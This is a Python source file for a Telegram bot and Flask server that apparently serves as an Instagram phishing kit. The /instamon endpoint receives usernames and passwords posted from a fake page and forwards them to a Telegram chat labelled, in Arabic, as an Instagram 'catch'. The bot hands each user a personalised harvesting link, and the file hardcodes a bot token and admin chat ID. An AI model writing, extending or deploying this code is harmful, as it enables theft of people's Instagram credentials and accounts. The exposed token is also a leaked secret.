import os, threading, telebot
from telebot import types
from flask import Flask, request, render_template_string

TOKEN = "8936795820:AAFE9MM8zAHcQBX026lDi78Td5bcLghI8JE"
ADMIN_CHAT_ID = "8328829705"
BASE_URL = os.environ.get("RENDER_EXTERNAL_URL", "https://ahmadnom-bot.onrender.com")

bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

@app.route('/instamon', methods=['GET', 'POST'])
def instamon():
    tc = request.args.get('chat_id', ADMIN_CHAT_ID)
    if request.method == 'POST':
        d = request.form.to_dict()
        bot.send_message(tc, f"📸 صيد انستغرام:\nيوزر: {d.get('username')}\nباس: {d.get('password')}")
        return "تم بنجاح", 200
    return "Instagram Page"

@bot.message_handler(commands=['start'])
def start(m):
    mku = types.InlineKeyboardMarkup()
    mku.add(types.InlineKeyboardButton("انستغرام", callback_data="insta"))
    bot.send_message(m.chat.id, "اختر:", reply_markup=mku)

@bot.callback_query_handler(func=lambda c: True)
def cb(c):
    link = f"{BASE_URL}/instamon?chat_id={c.from_user.id}"
    bot.send_message(c.message.chat.id, f"رابطك:\n{link}")

if __name__ == "__main__":
    threading.Thread(target=lambda: app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 10000)))).start()
    bot.infinity_polling()
